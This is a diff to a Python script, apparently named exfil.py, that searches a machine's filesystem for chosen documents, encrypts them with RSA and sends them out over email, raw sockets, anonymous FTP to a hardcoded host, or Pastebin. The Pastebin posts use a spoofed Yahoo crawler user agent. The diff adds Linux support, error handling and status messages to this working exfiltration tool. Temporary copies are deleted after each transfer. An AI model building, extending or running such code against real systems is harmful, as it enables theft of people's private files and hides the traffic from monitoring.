@@ -81,11 +81,11 @@ def plain_email(subject, contents):
         # server.set_debuglevel(1)
         server.sendmail(smtp_acct, tgt_accts, message)
         time.sleep(1)
-        print("Email sent successfully.")
+        print("[+] Email sent successfully! ")
         server.quit()
-    
-    except smtplib.SMTPAuthenticationError as e:
-        print(e)
+        
+    except smtplib.SMTPAuthenticationError:
+        print("[!] SMTP Authentication error, verify your username/password, hun.")
         server.quit()
 
 def RSA_generate():
@@ -108,81 +108,121 @@ def get_RSA_cipher(keytype):
     # Returns an RSA cipher object and the size of the RSA key in bytes
     return (PKCS1_OAEP.new(rsakey), rsakey.size_in_bytes())
 
-def find_docs(doc_type='.pdf'):                                                                # CHECK ME
+def find_docs(doc_type='.pdf'):                                                                
     ''' Walk entire filysystem to find files and returns its absolute path.'''
-    for parent, _, filenames in os.walk('C:\\'):
-        for filename in filenames:
-            if filename.endswith(doc_type):
-                document_path = os.path.join(parent, filename)
-                yield document_path
+    if os.name == 'nt':
+        for parent, _, filenames in os.walk('C:\\'):
+            for filename in filenames:
+                if filename.endswith(doc_type):
+                    document_path = os.path.join(parent, filename)
+                    yield document_path
+    else:
+        for parent, _, filenames in os.walk('/'):
+            for filename in filenames:
+                # if filename.endswith(doc_type):
+                if filename == doc_type:
+                    print(f"[+] Filename '{filename}' found!\n[+] Preparing exfiltration...")
+                    document_path = os.path.join(parent, filename)
+                    # return document_path
+                    # print(document_path)
+                    yield document_path
+                    return
+        print("[!] File not found :( Check for any typos, hun.")
 
 def exfiltrate(document_path, method):
     ''' Grabs a file and exfiltrates it based on the method you provide.'''
     # File transfer: Read, encrypt and save in tmp/.
     if method in ['transmit', 'plain_ftp']:
-        filename = f'C:\\Windows\\Temp\\{os.path.basename(document_path)}'                      # CHECK ME
-        with open (document_path, 'rb') as f0:
-            contents = f0.read()
-        with open(filename, 'wb') as f1:
-            f1.write(encrypt(contents))
-    # Send the file and delete it immediately.
-        EXFIL[method](filename)
-        os.unlink(filename)
+        if os.name == 'nt':
+            filename = f'C:\\Windows\\Temp\\{os.path.basename(document_path)}.duplicate'                      
+            with open (document_path, 'rb') as f0:
+                contents = f0.read()
+            with open(filename, 'wb') as f1:
+                f1.write(encrypt(contents))
+            # Send the file and delete it immediately.
+            EXFIL[method](filename)
+            os.unlink(filename)
+            print(f"[+] File '{filename}' was deleted from your system.")
+        else:
+            filename = f'/tmp/{os.path.basename(document_path)}.duplicate'
+            with open (document_path, 'rb') as f0:
+                contents = f0.read()
+            with open(filename, 'wb') as f1:
+                f1.write(encrypt(contents))
+            # Send the file and delete it immediately.
+            EXFIL[method](filename)
+            os.unlink(filename)
+            print(f"[+] File '{filename}' was deleted.")
 
     else:
+        # print(document_path)
+        # print(type(document_path))
         with open(document_path, 'rb') as f:
             contents = f.read()
         title = os.path.basename(document_path)
         contents = encrypt(contents)
+        # print(title)
+        # print(contents)
         EXFIL[method](title, contents)
 
-def run(method):
-    for fpath in find_docs():
-        print('here?')
-        exfiltrate(fpath, method)
-
 def email_helper():
+    global doc_type, tgt_accts, smtp_acct, smtp_password, smtp_server, smtp_port
     doc_type      = input("Enter the filename you want to encrypt and email: ")
     tgt_accts     = input('To: ')
 
     if os.name == 'nt':
         import win32com.client
-        run(outlook)
+        for fpath in find_docs(doc_type):
+            exfiltrate(fpath, 'outlook')
     else:
         # Google's SMTP info
         smtp_server   = 'smtp.gmail.com'
         smtp_port     = 587
         smtp_acct     = input('From: ')
         smtp_password = getpass.getpass()
-        run(plain_email)
+        for fpath in find_docs(doc_type): 
+            exfiltrate(fpath, 'plain_email')
 
 def file_helper():
-    doc_type = input("Enter the filename you want to encrypt and send it via file transfer: ")
+    global doc_type, server
+    doc_type = input("Enter the filename you want to encrypt and send via file transfer: ")
 
-    if os.name == 'nt':
-        import win32file
-        run(transmit)
-    else:
-        server   = input("Enter FTP server IP: ")
-        run(plain_ftp)
+    for fpath in find_docs(doc_type):
+        if os.name == 'nt':
+            import win32file
+            server = input("Enter the host you'd like to connect to: ")
+            exfiltrate(fpath, 'transmit')
+        else:
+            ftp_server   = input("Enter FTP server IP: ")
+            exfiltrate(fpath, 'plain_ftp')
 
 def transmit(filepath, server='10.0.2.13'):
     '''Windows version'''
     client = socket.socket()
     # Open a port of our choosing
-    client.connect((server, 10000))
+    try:
+        client.connect((server, 10000))
+    except socket.error:
+        print("The connection was refused.")
+        return
     
     with open(filepath, 'rb') as f:
         win32file.TransmitFile(
             client, win32file._get_osfhandle(f.fileno()), 0, 0, None, 0, b'', b'')
+    
+    print(f'\nFile {filepath} was sent successfully.')
 
-def plain_ftp(filepath, server='10.0.2.13'):
-    ftp = ftplib.FTP(server)
+def plain_ftp(filepath, ftp_server='10.0.2.13'):
+    try:
+        ftp = ftplib.FTP(ftp_server)
+    except OSError:
+        print("[!] Unable to connect to the server. Try to ping it or check if the service is running.") 
+        return
     ftp.login("anonymous", "anon@example.com")
     ftp.cwd('/pub/')
     ftp.storbinary("STOR " + os.path.basename(filepath), open(filepath, "rb"), 1024)
     ftp.quit()
-    print(f'File {filepath} sent successfully.')
+    print(f'\nFile {filepath} was sent successfully.')
 
 def plain_paste(title, contents):
     login_url   = 'https://pastebin.com/api/api_login.php'
@@ -205,8 +245,11 @@ def plain_paste(title, contents):
     }
 
     r = requests.post(paste_url, data=paste_data, headers=header)
-    print(r.status_code)
-    print(r.text)
+
+    if (r.status_code == 200):
+        print(f"[+] Data has been posted successfully: {r.text}")
+    if (r.status_code == 422):
+        print(f"[!] Authentication error: Please check your credentials, hun")
 
 def wait_for_browser(browser):
     ''' Ensures the browser has finished its events and can be used.'''
@@ -265,10 +308,10 @@ def ie_paste(title, contents):
     ie.Quit()
 
 def post_helper():
+    global agent, header, doc_type, api_dev_key, username, password
     # Authentication
     username    = input("Enter your Pastebin username: ")
     password    = getpass.getpass(prompt='Enter your Pastebin password: ')
-    api_dev_key = input("Enter your Pastebin API key: ")
     # Yahoo web crawler
     agent    = 'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)' 
     header = {'User-Agent': agent}
@@ -276,9 +319,12 @@ def post_helper():
     
     if os.name == 'nt':
         from win32com import client
-        run(ie_paste)
+        for fpath in find_docs(doc_type):
+            exfiltrate(fpath, 'ie_paste')
     else:
-        run(plain_email)
+        api_dev_key = input("Enter your Pastebin API key: ")
+        for fpath in find_docs(doc_type):
+            exfiltrate(fpath, 'plain_paste')
 
 # Dictionary dispatch to make the calling of the functions easy
 EXFIL = {
@@ -301,7 +347,7 @@ if __name__ == '__main__':
         $ python3 exfil.py -p --post     # Encrypt a file and post it in Pastebin.
 
             '''))
-    parser.add_argument('-e', '--encrypt', action = 'store_true', help = 'Encrypt plaintext and dump contents into a new file')
+    parser.add_argument('-e', '--encrypt', action = 'store_true', help = 'Encrypt data and dump into a new file')
     parser.add_argument('-d', '--decrypt', action = 'store_true', help = 'Decrypt ciphertext from a file')
     parser.add_argument('-m', '--mail',    action = 'store_true', help = 'Encrypt a file and send it out in an email.')
     parser.add_argument('-f', '--file',    action = 'store_true', help = 'Encrypt a file and send it out via file transfer.')
@@ -318,7 +364,7 @@ if __name__ == '__main__':
         plaintext = input("Enter the text you want to encrypt, hun: ").encode()
         with open(f'{filename}-encrypted.txt', 'wb') as f:
             f.write(encrypt(plaintext))
-            print(f'Data has been encrypted and saved here: ./{filename}-encrypted.txt') 
+            print(f'\n[*] Data has been encrypted and saved here: ./{filename}-encrypted.txt') 
     
     if args.decrypt:
         file2decrypt = input("Enter the filename you want to decrypt: ")
@@ -327,7 +373,7 @@ if __name__ == '__main__':
                 contents = f.read()
             print(decrypt(contents))
         except FileNotFoundError as e:
-            print("There is not a file with that name. Please check for typos.")
+            print("[!] There is not a file with that name. Please check for typos.")
 
     if args.mail:
         email_helper()
